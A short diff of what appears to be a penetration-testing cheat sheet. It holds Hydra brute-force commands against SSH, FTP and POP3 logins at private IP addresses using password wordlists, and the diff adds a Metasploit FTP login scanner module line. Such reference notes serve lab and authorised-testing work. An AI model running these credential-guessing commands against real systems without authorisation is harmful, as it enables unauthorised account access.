@@ -18,6 +18,7 @@ hydra -t 4 -l root -P /usr/share/wordlists/cristi-passwords.txt 127.0.0.1 -s 500
 
   ## Bruteforce FTP
 hydra -t 4 -L /usr/share/wordlists/cristi.txt -P /usr/share/wordlists/cristi-passwords.txt 192.168.13.236 ftp
+use auxiliary/scanner/ftp/ftp_login
 
   ##Bruteforce POP3
 hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.158 pop3
